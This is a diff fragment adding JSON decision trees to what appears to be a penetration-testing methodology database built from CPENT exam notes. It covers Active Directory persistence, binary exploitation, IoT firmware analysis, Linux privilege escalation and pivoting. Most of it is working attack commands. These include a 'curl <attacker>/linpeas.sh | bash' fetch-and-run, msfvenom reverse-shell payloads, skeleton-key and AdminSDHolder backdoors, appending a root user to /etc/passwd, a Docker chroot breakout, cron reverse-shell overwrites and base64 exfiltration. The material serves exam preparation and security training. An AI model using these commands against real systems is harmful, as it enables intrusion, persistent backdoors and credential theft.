+            "fallback": "Silver ticket for specific service: kerberos::golden /service:cifs /target:<fqdn> /rc4:<svc-hash> /ptt"
+          },
+          {
+            "condition": "DA + DC access available",
+            "action": "mimikatz misc::skeleton (master password for all accounts)",
+            "fallback": "AdminSDHolder backdoor: modify ACL on AdminSDHolder to grant low-priv user full control (replicates every 60 min)"
+          },
+          {
+            "condition": "Need stealthy persistence",
+            "action": "DSRM password abuse: reg save HKLM\\SAM/\\SYSTEM; impacket-secretsdump -sam sam.save -system system.save LOCAL",
+            "fallback": "Plumhound for AD audit-log persistence tracking"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "binary-argha-dey-methodology",
+    "zone": "binary-exploitation",
+    "name": "Argha Dey Binary Exploitation Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Complete A-to-Z guide: static analysis (file, strings, readelf, checksec, radare2, Ghidra) → dynamic analysis (strace, ltrace, GDB with GEF/PEDA/pwndbg) → exploitation (BOF → ret2libc → ROP → format string → heap). Includes full worked example and exam playbook.",
+    "examHabits": [
+      "Always run checksec --file=binary first - answers almost every protection question in one shot",
+      "Run the exact sequence: file → checksec → strings|grep flag/bin/pass → gdb break main → info proc mappings → find/ROPgadget",
+      "For address-of questions: use GDB breakpoints + info proc mappings to compute runtime addresses",
+      "For ret2libc offset: p system; find /bin/sh; p/x addr_binsh - addr_system (constant regardless of ASLR)",
+      "If ASLR is on: leak via GOT (puts@plt puts@got + main loop), then compute libc base",
+      "Understand manual compilation path, not just Metasploit - CPENT often doesn't provide Metasploit access",
+      "Always verify kernel/software version and patch level before kernel exploits - they can crash the target"
+    ],
+    "quickRef": "checksec --file=./binary | ROPgadget --binary ./binary --only 'pop|ret' | python3 -c 'from pwn import *; ...' | gdb -q ./binary",
+    "steps": [
+      {
+        "phase": "Stage 1 - Triage & Protection Check",
+        "techniques": [],
+        "tools": [
+          "file",
+          "checksec",
+          "readelf",
+          "objdump"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "ELF binary received",
+            "action": "file ./binary (arch, bits, static/dynamic, stripped, PIE); checksec --file=./binary (RELRO, Canary, NX, PIE, RPATH, RUNPATH)",
+            "fallback": "Manual: readelf -h (Type: EXEC=No PIE, DYN=PIE); readelf -l | grep GNU_STACK (E flag=NX off); readelf -d | grep BIND_NOW (Full RELRO)"
+          },
+          {
+            "condition": "Need runtime info without debug symbols",
+            "action": "strings -t x ./binary | grep -i 'flag|pass|/bin/sh'; readelf -h | grep 'Entry point'; readelf -l | grep program headers",
+            "fallback": "nm ./binary | grep ' T ' (defined functions); objdump -R ./binary (dynamic relocations)"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 2 - Stack-Based Buffer Overflow (no protections)",
+        "techniques": [
+          "buffer-overflow"
+        ],
+        "tools": [
+          "pwn",
+          "gdb-peda",
+          "ROPgadget",
+          "pwntools"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Suspected BOF, need crash offset",
+            "action": "python3 -c 'from pwn import *; print(cyclic(300).decode())' > /tmp/pattern; gdb: run < /tmp/pattern; i r eip (shows 0x62616161)",
+            "fallback": "pwn cyclic -l 0x61616166 (instant offset); or msf-pattern_create -l 200 + msf-pattern_offset -q <eip_value>"
+          },
+          {
+            "condition": "NX disabled (stack executable)",
+            "action": "Find JMP ESP: objdump -d libc.so.6 | grep -B2 'jmp.*esp'; ROPgadget --binary ./binary --only 'jmp|call' | grep esp. Build payload: A*offset + jmp_esp + NOP sled + shellcode",
+            "fallback": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\\x00\\x0a\\x0d'"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 3 - Return-to-libc (ret2libc) - bypasses NX",
+        "techniques": [
+          "rop-chain"
+        ],
+        "tools": [
+          "gdb-peda",
+          "pwntools"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "NX enabled, ASLR on/off",
+            "action": "gdb-peda: p system; find /bin/sh; p/x addr_binsh - addr_system (constant offset). Payload: A*offset + system_addr + exit_addr + binsh_addr",
+            "fallback": "For x86_64: need pop rdi; ret gadget to set RDI register before calling system"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 4 - ROP Chains (NX bypass + ASLR)",
+        "techniques": [
+          "rop-chain"
+        ],
+        "tools": [
+          "ROPgadget",
+          "ropper",
+          "pwntools"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Need ROP gadgets",
+            "action": "ROPgadget --binary ./binary --only 'pop|ret'; ROPgadget --binary ./binary --only 'pop rdi|ret' (x64 arg gadget); ropper --file ./binary --search 'pop rdi'",
+            "fallback": "ROPgadget --binary ./binary --string '/bin/sh' (find embedded string)"
+          },
+          {
+            "condition": "ASLR on - need info leak chain",
+            "action": "Stage 1: leak puts() via GOT: payload = A*offset + pop_rdi + puts_got + puts_plt + main_addr; Stage 2: libc.address = leaked - libc.symbols['puts']; call system(binsh)",
+            "fallback": "one_gadget ./libc.so.6 for single-instruction win (satisfy register constraints)"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 5 - GOT Overwrite (Partial/No RELRO + Format String)",
+        "techniques": [
+          "got-overwrite",
+          "format-string-exploit"
+        ],
+        "tools": [
+          "pwntools"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Format string bug present",
+            "action": "Confirm: ./binary '%x %x %x'; find offset where input appears; Leak: p.sendline(b'%7$s'); Arbitrary write: fmtstr_payload(offset, {target_got: new_value})",
+            "fallback": "Use pwntools fmtstr_payload(6, {elf.got['exit']: elf.symbols['win_function']})"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 6 - Format String Exploitation",
+        "techniques": [
+          "format-string",
+          "format-string-exploit"
+        ],
+        "tools": [
+          "gdb-peda",
+          "pwntools"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "printf(user_input) vulnerability found",
+            "action": "Step 1: ./binary 'AAAA.%x.%x.%x' find which %N$x shows 41414141; Step 2: leak memory ./binary '%7$s'; Step 3: arbitrary write with %n: fmtstr_payload(6, {got_target: value})",
+            "fallback": "Use pwntools fmtstr_payload with payload dictionary to automate offset + write"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 7 - Heap Exploitation (overview)",
+        "techniques": [
+          "heap-use-after-free",
+          "heap-tcache-poison",
+          "heap-fastbin-dup",
+          "heap-double-free",
+          "heap-house-of-force"
+        ],
+        "tools": [
+          "gdb-peda",
+          "pwndbg"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Heap vulnerability suspected (UAF, double free, tcache/fastbin)",
+            "action": "gdb: gef> heap chunks; gef> heap bins; pwndbg> heap; pwndbg> bins; pwndbg> tcache",
+            "fallback": "Concepts: UAF=use-after-free pointer reuse; Tcache poisoning=overwrite fd of freed chunk; Fastbin attack=fastbin freelist; House of Force=corrupt top chunk"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 8 - SROP / ret2csu / Integer Overflow",
+        "techniques": [
+          "srop",
+          "ret2csu",
+          "integer-overflow"
+        ],
+        "tools": [
+          "pwntools",
+          "ROPgadget"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Sigreturn-oriented programming needed (syscall without ret-control)",
+            "action": "Use SigreturnFrame from pwntools to set rax=0, rdi=1, etc., then find a sigreturn gadget",
+            "fallback": "ret2csu: use __libc_csu_init gadgets (pop rbx; pop rbp; pop r12-r15; ret) for multi-register control"
+          },
+          {
+            "condition": "Integer overflow in length field",
+            "action": "Negative signed value bypasses (int)len < MAX_SIZE check, but used as unsigned in memcpy/malloc",
+            "fallback": "Send -1 where unsigned wraps to huge value"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 9 - Shellcoding",
+        "techniques": [
+          "shellcode-development"
+        ],
+        "tools": [
+          "msfvenom",
+          "pwntools",
+          "nasm"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Need custom shellcode",
+            "action": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\\x00\\x0a\\x0d'",
+            "fallback": "Manual: nasm -f elf32 shellcode.asm -o shellcode.o; objcopy -O binary -j .text shellcode.o shellcode.bin; xxd -i shellcode.bin"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 10 - PwnTools Full Workflow Reference",
+        "techniques": [],
+        "tools": [
+          "pwntools"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Building exploit script",
+            "action": "context.arch='amd64'; elf=ELF('./binary'); libc=ELF('./libc.so.6'); p=remote('target',port) or process; p.sendline/p.recvline/p.recvuntil/p.sendafter; p.interactive()",
+            "fallback": "Helpers: p64/p32 pack; u64/u32 unpack; cyclic/cyclic_find; elf.symbols['main'], elf.got['puts'], elf.plt['puts']; fmtstr_payload(offset, {target: value})"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 11 - Exam Playbook: Step-by-Step on Every Binary",
+        "techniques": [],
+        "tools": [
+          "file",
+          "checksec",
+          "strings",
+          "readelf",
+          "gdb",
+          "ROPgadget",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "New Linux ELF handed in exam",
+            "action": "1. file ./target 2. checksec --file=./target 3. strings -t x | grep flag/bin/pass 4. GDB: break main, run, info proc mappings, find strings 5. ROPgadget/ropper for gadgets 6. Compute system/binsh offset 7. sudo -l / find / -perm -u=s / cat /etc/crontab for privesc",
+            "fallback": "If binary won't run: qemu-<arch>-static for cross-arch; patchelf to match local libc"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "iot-argha-dey-methodology",
+    "zone": "iot-firmware",
+    "name": "Argha Dey IoT Firmware Analysis Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "4-stage IoT methodology: Recon/Enumeration → Firmware Acquisition → Firmware Static Analysis → Binary/Runtime Exploitation. Includes exam-day tips, firmware header cheat-sheet, question-pattern mapping, and full tool reference.",
+    "examHabits": [
+      "Always run binwalk before anything else on any .bin file - it answers 60-70% of firmware questions in one shot",
+      "Check target locale/date format (date command) before answering date-formatted questions - labs use YYYY-DD-MM traps",
+      "If binwalk shows nothing → suspect encryption; confirm with -E (entropy) flag - high flat entropy + no signatures = encrypted",
+      "Don't install tools on the target box - pivot file via Python HTTP server + wget (faster, no root/apt needed)",
+      "Recursive/forced extraction (eM --dd='.*') is fallback when default binwalk doesn't reveal FS name - walk nested folders manually",
+      "Distinguish standard vs custom directories - questions want non-standard folders (pwnable dir), not /etc, /bin, /usr",
+      "For device-identification questions: browser page title + quick Google search is fastest (e.g. 'dsp-w215' → HNAP → SOAP family)",
+      "Always start binary exploitation with file (arch + stripped) → readelf -h/-l → gdb-peda → qemu-<arch>-static if non-native"
+    ],
+    "quickRef": "binwalk FileOne.bin; binwalk -eM --dd='.*' FileOne.bin; file <extracted>; strings | grep -i busybox|gcc|linux version; sqlite3 config.sqlite .dump | grep -i <device>",
+    "steps": [
+      {
+        "phase": "Stage 1 - Recon/Enumeration",
+        "techniques": [
+          "passive-recon",
+          "firmware-extraction"
+        ],
+        "tools": [
+          "nmap",
+          "ssh",
+          "wget",
+          "python3"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "IoT host discovered on network",
+            "action": "nmap -sCV -p- <ip> — note SSH banner (OpenSSH tells base OS/Linux kernel), http admin panels, /cgi-bin/",
+            "fallback": "ssh <user>@<target-ip> with supplied creds or hydra brute force"
+          },
+          {
+            "condition": "Firmware file located on target",
+            "action": "Method A: python3 -m http.server 8080 (on target); wget http://<target-ip>:8080/<file>.bin (on attacker). Method B: scp user@<target>:/path/to/file.bin . (Method C: cat/base64 exfil over HTTP if shell only)",
+            "fallback": "If binwalk not on target: pivot the file rather than installing tools on target"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 2 - Firmware Acquisition",
+        "techniques": [
+          "firmware-extraction"
+        ],
+        "tools": [
+          "scp",
+          "wget",
+          "binwalk",
+          "file"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Firmware file on attacker box",
+            "action": "file FileOne.bin — if 'data', it's a generic firmware blob, not recognizable filetype",
+            "fallback": "binwalk FileOne.bin — scan for embedded signatures"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 3 - Firmware Static Analysis",
+        "techniques": [
+          "firmware-extraction"
+        ],
+        "tools": [
+          "binwalk",
+          "file",
+          "strings",
+          "readelf",
+          "grep",
+          "sqlite3"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Firmware binary acquired",
+            "action": "binwalk -eM FileOne.bin (recursive extraction + Matryoshka); if no signatures, try binwalk -eM --dd='.*' FileOne.bin",
+            "fallback": "binwalk -E FileOne.bin for entropy analysis (detect encryption)"
+          },
+          {
+            "condition": "Entropy high + no recognizable headers",
+            "action": "Treat as encrypted — no further unpacking possible",
+            "fallback": "If entropy high but gzip/LZMA signatures present: it's compressed, not encrypted"
+          },
+          {
+            "condition": "Filesystem extracted (Squashfs/JFFS2)",
+            "action": "cd squashfs-root; ls; look for non-standard dirs (pwnable/, custom services); grep -Rin 'passwd=' .; grep -Rin 'root:' . | grep -v Binary; cat etc/passwd; cat etc/shadow",
+            "fallback": "find . -iname config*; sqlite3 config.sqlite .dump | grep -i <devicename>"
+          },
+          {
+            "condition": "Extracted artifacts found",
+            "action": "strings <binary> | grep -i 'busybox|gcc|linux version' for BusyBox/GCC/kernel version banners; find . -type f -regextype posix-extended -regex '.*/[a-z]{5}_[a-z]{6}' for flag-named files",
+            "fallback": "file <extracted_file> (hex filename = offset; cross-ref binwalk decimal/hex columns)"
+          },
+          {
+            "condition": "Web admin panel identified via page title",
+            "action": "Open Login.html in browser, note title (e.g. DSP-W215 → Google → HNAP/SOAP family protocol)",
+            "fallback": "grep -Rn 'DeviceID' . for device model"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 4 - Binary/Runtime Exploitation",
+        "techniques": [
+          "buffer-overflow",
+          "format-string",
+          "heap-use-after-free"
+        ],
+        "tools": [
+          "file",
+          "readelf",
+          "objdump",
+          "gdb-peda",
+          "gdb-multiarch",
+          "qemu-arm-static",
+          "qemu-mips-static"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "ARM/MIPS/Blackfin binary found in pwnable dir",
+            "action": "file <binary> (arch + stripped state); readelf -h (entry point, machine); readelf -l (segments, GNU_STACK for NX, GNU_RELRO); checksec --file=<binary>",
+            "fallback": "qemu-arm-static -g 1234 ./binary &; gdb-multiarch; set architecture arm; target remote localhost:1234"
+          },
+          {
+            "condition": "Non-stripped binary with known function",
+            "action": "gdb: break main; run; p system; find /bin/sh; p/x <addr1> - <addr2> for ret2libc offset; check protections for exploit strategy",
+            "fallback": "ROPgadget --binary ./binary --only 'pop|ret'; ropper --file ./binary --search 'pop rdi'"
+          },
+          {
+            "condition": "MIPS/ARM binary needs emulation",
+            "action": "qemu-mips-static ./binary OR qemu-arm-static ./binary; qemu-arm -g 1234 ./binary & + gdb-multiarch for debugging",
+            "fallback": "patchelf to set local libc/interpreter matching remote target"
+          }
+        ]
+      },
+      {
+        "phase": "Firmware Cheat-Sheet: Question-Pattern → Method Map",
+        "techniques": [
+          "firmware-extraction"
+        ],
+        "tools": [
+          "binwalk",
+          "file",
+          "strings",
+          "sqlite3",
+          "readelf"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Question: 'Block size of firmware'",
+            "action": "binwalk file.bin → 'blocksize: NNNNN bytes'",
+            "fallback": "File: 'FileOne.bin: data'"
+          },
+          {
+            "condition": "Question: 'CPU architecture'",
+            "action": "binwalk file.bin → 'CPU ARCH' in uImage header line OR file <extracted_binary>",
+            "fallback": "readelf -h <binary> | grep Machine"
+          },
+          {
+            "condition": "Question: 'Linux version compatible / kernel'",
+            "action": "strings <binary> | grep 'linux version'; binwalk → uImage 'Linux-XX.X.XX' string",
+            "fallback": "readelf -h for entry point + program headers"
+          },
+          {
+            "condition": "Question: 'File system type'",
+            "action": "binwalk description line: Squashfs / JFFS2 / CRAMFS",
+            "fallback": "readelf -l for program headers"
+          },
+          {
+            "condition": "Question: 'Offset of extracted file'",
+            "action": "Cross-ref binwalk decimal/hex column, or the file's own numeric name (hex offset)",
+            "fallback": "file _extracted/<hexname> to confirm type"
+          },
+          {
+            "condition": "Question: 'Device IP from config DB'",
+            "action": "sqlite3 config.sqlite .dump | grep -i <devicename>",
+            "fallback": "strings to find BusyBox/GCC version"
+          },
+          {
+            "condition": "Question: 'BusyBox / GCC version'",
+            "action": "strings busybox | grep -i busybox; strings <binary> | grep -i gcc",
+            "fallback": "readelf -p .comment <binary> for GCC version string"
+          },
+          {
+            "condition": "Question: 'File containing root password'",
+            "action": "find . -iname passwd; cat etc/passwd; cat etc/shadow; grep for root: inside extracted files",
+            "fallback": "hashcat -m <mode> hash.txt rockyou.txt to crack"
+          },
+          {
+            "condition": "Question: 'Firmware device name/model'",
+            "action": "grep webroot for DeviceID:/title tags; or config DB dump; or browser page title + Google",
+            "fallback": "strings <binary> | grep for model-specific strings"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 5 - Squashfs-root Directory Hunting Cheatsheet",
+        "techniques": [
+          "firmware-extraction"
+        ],
+        "tools": [
+          "ls",
+          "find",
+          "strings",
+          "grep",
+          "sqlite3"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Inside squashfs-root/",
+            "action": "cd usr/local (third-party services like samba); cd pwnable (custom exploit-dev challenge dirs = attack surface); cd www/www-ro (web front-end, check .cgi/.asp/.html); cd etc (passwd/shadow, network configs); cd mnt (config.sqlite, persistent storage)",
+            "fallback": "grep -Rin 'passwd=' .; grep -Rin 'password' . --include=*.cgi; find . -iname '*.sqlite'"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "linux-privesc-argha-dey-methodology",
+    "zone": "privilege-escalation",
+    "name": "Argha Dey Linux Privilege Escalation Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Recommended Exam-Day Workflow: id && sudo -l && uname -a → LinPEAS → SUID/SGID → sudo rules → cron → kernel CVEs → password hunting → container breakout. Includes A-Z technique catalogue and kernel exploit catalogue (Dirty COW, Dirty Pipe, PwnKit, Baron Samedit, OverlayFS, Netfilter, PolicyKit, Dirty Sock).",
+    "examHabits": [
+      "Run LinPEAS and review high/red-flagged items first",
+      "Check SUID/SGID binaries with find / -perm -4000 -type f 2>/dev/null",
+      "Check capabilities with getcap -r / 2>/dev/null",
+      "Check sudo rules with sudo -l against GTFOBins",
+      "Check cron jobs with pspy (monitor without root)",
+      "Cross-check kernel/sudo/polkit version against known CVEs (Dirty Pipe, PwnKit, Baron Samedit)",
+      "Check for password/config file leftovers and reused SSH keys",
+      "If in docker/lxd group: container breakout via docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+      "Always verify kernel/software version and patch level first — kernel exploits can crash the target",
+      "Understand the manual compilation path, not just Metasploit — CPENT exam often doesn't provide Metasploit access"
+    ],
+    "quickRef": "id && sudo -l && uname -a → linpeas.sh → find / -perm -4000 → getcap -r / → cat /etc/crontab → searchsploit linux kernel <version>",
+    "steps": [
+      {
+        "phase": "Phase 1 - Enumeration (Always Start Here)",
+        "techniques": [],
+        "tools": [
+          "linpeas",
+          "linenum",
+          "lse"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Fresh foothold on Linux",
+            "action": "id; whoami; uname -a; cat /etc/os-release; cat /proc/version; sudo -l; cat /etc/passwd; cat /etc/group; groups",
+            "fallback": "If LinPEAS not available: ps aux; ss -tulpn; env; echo $PATH; history"
+          },
+          {
+            "condition": "Automated tools needed",
+            "action": "curl http://<attacker>/linpeas.sh | bash; review red-flagged items first",
+            "fallback": "Linux Exploit Suggester (les.sh) to narrow down CVEs by kernel/sudo version"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - SUID / SGID Binary Abuse",
+        "techniques": [
+          "suid-abuse"
+        ],
+        "tools": [
+          "linpeas",
+          "find"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SUID binaries found (find / -perm -4000)",
+            "action": "Check each against GTFOBins for known exploitation one-liners (e.g., find / -exec /bin/sh -p \\; -quit if find has SUID)",
+            "fallback": "Run binary with special args: nmap --interactive, vim -c '!bash', awk 'BEGIN {system(\"/bin/sh\")}'"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Sudo Misconfigurations",
+        "techniques": [
+          "sudo-misconfiguration"
+        ],
+        "tools": [
+          "sudo",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "sudo -l shows NOPASSWD entries",
+            "action": "Check if binary can spawn shell: sudo vim -c ':!/bin/sh'; sudo less /etc/hosts then type !/bin/sh",
+            "fallback": "Wildcard injection: sudo /usr/bin/php* or path traversal in sudoers"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - Cron Jobs",
+        "techniques": [
+          "cron-jobs"
+        ],
+        "tools": [
+          "pspy",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Scripts run by root are world-writable",
+            "action": "Overwrite script with reverse shell payload; wait for cron to fire",
+            "fallback": "Wildcard injection in tar/rsync cron: echo '' > --checkpoint=1; echo '' > --checkpoint-action=exec=sh shell.sh"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Environment Variable / PATH Abuse",
+        "techniques": [
+          "suid-abuse",
+          "sudo-misconfiguration"
+        ],
+        "tools": [
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Root-executed script calls binary without absolute path",
+            "action": "PATH hijack: echo '/bin/bash' > /tmp/ls; chmod +x /tmp/ls; export PATH=/tmp:$PATH",
+            "fallback": "LD_PRELOAD: check sudo -l for env_keep+=LD_PRELOAD; craft malicious .so loading as root"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - Capabilities & File Permission Weaknesses",
+        "techniques": [
+          "suid-abuse"
+        ],
+        "tools": [
+          "getcap",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Binaries with dangerous capabilities found",
+            "action": "getcap -r / → find cap_setuid+ep on python/perl; exploit: /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+            "fallback": "Find writable /etc/passwd → append root user: openssl passwd -1 -salt abc password123; echo 'hacker:$1$abc$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - Password Hunting & SSH Key Reuse",
+        "techniques": [
+          "suid-abuse"
+        ],
+        "tools": [
+          "grep",
+          "find",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Searching for hardcoded secrets",
+            "action": "grep -r 'password' /etc /var /opt 2>/dev/null; find / -name '*.bak' -o -name '*.old' -o -name '*config*' 2>/dev/null; cat ~/.bash_history; cat /var/log/*.log | grep -i pass",
+            "fallback": "find / -name authorized_keys 2>/dev/null; find / -name id_rsa 2>/dev/null — check for reused keys"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 8 - NFS no_root_squash",
+        "techniques": [
+          "suid-abuse"
+        ],
+        "tools": [
+          "showmount",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "NFS share mounted with no_root_squash",
+            "action": "showmount -e <target>; mount NFS; create root-owned SUID binary on attacker, copy to share, it retains root privileges",
+            "fallback": "Check /etc/exports for share configuration"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 9 - Container Breakout (Docker/LXD group)",
+        "techniques": [
+          "suid-abuse"
+        ],
+        "tools": [
+          "docker",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "User in docker group (id shows docker)",
+            "action": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+            "fallback": "LXD group: build privileged container image, mount host /"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 10 - Kernel Exploits (CVE Catalogue)",
+        "techniques": [],
+        "tools": [
+          "searchsploit",
+          "linux-exploit-suggester",
+          "msfconsole",
+          "gcc"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Kernel version confirmed via uname -a",
+            "action": "Cross-reference: CVE-2016-5195 (Dirty COW, <4.8.3); CVE-2022-0847 (Dirty Pipe, 5.8-5.16.10); CVE-2021-4034 (PwnKit/PKEXEC); CVE-2021-3156 (Baron Samedit/sudo); CVE-2021-3493 (OverlayFS); CVE-2022-25636 (Netfilter); CVE-2021-3560 (PolicyKit); CVE-2019-7304 (Dirty Sock/Snapd)",
+            "fallback": "Only attempt if OS is unpatched; document patch level match carefully first (wmic qfe) — kernel exploits can BSOD a box"
+          },
+          {
+            "condition": "Metasploit path preferred",
+            "action": "use post/multi/recon/local_exploit_suggester; set SESSION <id>; or use exploit/linux/local/* modules",
+            "fallback": "Manual: searchsploit <cve> → fetch PoC → compile → execute (gcc -pthread, make, etc.)"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 11 - Post-Exploitation Proof (after root achieved)",
+        "techniques": [],
+        "tools": [
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Root shell obtained",
+            "action": "cat /etc/shadow; hostname; id (confirm uid=0); find / -name flag.txt -o -name root.txt 2>/dev/null",
+            "fallback": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' for stable root shell"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "pivoting-argha-dey-methodology",
+    "zone": "lateral-movement",
+    "name": "Argha Dey Pivoting & Tunneling Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Chisel A-Z (server/client setup, local port forwarding, multi-pivot chaining) and Ligolo-ng A-Z (TUN interface, proxy/agent architecture, CLI + GUI/WebUI, multi-pivot). Includes comparison table and exam tips.",
+    "examHabits": [
+      "Always confirm dual-homed hosts first - run ifconfig/ip a on every pivot to find the second network leg",
+      "Use -sT (TCP connect scan), never -sS (SYN) through Ligolo-ng's TUN or proxychains - raw/SYN scans don't traverse tunnels",
+      "Always use -Pn with nmap when pivoting - ICMP echo often doesn't traverse the tunnel/SOCKS proxy",
+      "Document each pivot hop - IP addresses, tool used, command run, screenshot routing table (ip route) and session list",
+      "If Chisel is blocked/detected: prefer Ligolo-ng or rename/obfuscate binaries, fall back to native SSH -R/-D or plink.exe",
+      "Clean up: kill agents (agent_kill), remove routes (route_del), delete tun interfaces (interface_delete), stop chisel processes",
+      "When double/triple pivoting: create a NEW distinct tun interface name per hop (ligolo, ligolo-double, ligolo-triple) to avoid route collisions",
+      "If only ONE service needed (RDP/SMB): Chisel local/remote port-forward is faster than full Ligolo tunnel",
+      "If enumerating/attacking MANY hosts across a subnet: Ligolo-ng is faster and less error-prone than proxychains + Chisel"
+    ],
+    "quickRef": "CHISEL: chisel server -p 8000 --reverse (attacker); ./chisel client <kali>:8000 R:socks (pivot); proxychains nmap -sT -Pn 172.16.1.0/24 | LIGOLO: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ./proxy -selfcert -laddr 0.0.0.0:11601; ./agent -connect <kali>:11601 -ignore-cert; route_add + tunnel_start",
+    "steps": [
+      {
+        "phase": "Stage 1 - Core Concepts",
+        "techniques": [
+          "pivoting",
+          "double-pivot"
+        ],
+        "tools": [
+          "chisel",
+          "ligolo-ng",
+          "proxychains4",
+          "socat",
+          "ssh"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Understanding pivot vs tunnel",
+            "action": "Pivoting = strategy (using compromised host to reach internal network); Tunneling = mechanism (encapsulated channel over HTTP/HTTPS/SSH/DNS to bypass firewalls/ACLs)",
+            "fallback": "Port forwarding = specific technique of tunneling (local: ssh -L; remote: ssh -R; dynamic SOCKS: ssh -D)"
+          },
+          {
+            "condition": "Single vs Multi-pivot needed",
+            "action": "Single: Attacker → Pivot1 → Network A. Double: Attacker → Pivot1 → Pivot2 → Network B. Multi: N hops chained",
+            "fallback": "Identify by counting network segments between attacker and final target"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 2 - Chisel (A to Z)",
+        "techniques": [
+          "pivoting"
+        ],
+        "tools": [
+          "chisel",
+          "proxychains4",
+          "nmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Single pivot - need SOCKS proxy",
+            "action": "Attacker: chisel server -p 8000 --reverse. Pivot: ./chisel client <kali-ip>:8000 R:socks. Configure proxychains: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf. proxychains nmap -sT -Pn <internal-range>",
+            "fallback": "If proxychains breaks tools: use Chisel local forward R:3389:172.16.1.20:3389 then connect directly"
+          },
+          {
+            "condition": "Multi-pivot needed (double/triple pivot)",
+            "action": "On Pivot1: run second chisel server --reverse --socks5 listening on internal iface; on Pivot2: connect to Pivot1 with R:socks; on attacker: chain proxychains config with two SOCKS entries (port 1080 for 172.16.x, port 1081 for 192.168.50.x)",
+            "fallback": "Option A recommended: chisel server -p 9000 --reverse --socks5 on Pivot1; ./chisel client 172.16.1.10:9000 R:socks on Pivot2; relay up via ./chisel client <kali>:8000 R:socks R:1081:127.0.0.1:1080"
+          },
+          {
+            "condition": "OPSEC / exam hardening needed",
+            "action": "Add --auth user:pass; --tls-skip-verify; --fingerprint <hash> to verify server cert (prevents MITM); --keepalive 25s to survive idle firewalls",
+            "fallback": "Standard: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 3 - Ligolo-ng (A to Z, CLI)",
+        "techniques": [
+          "pivoting",
+          "double-pivot"
+        ],
+        "tools": [
+          "ligolo-ng",
+          "nmap",
+          "ip"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Single pivot - TUN setup",
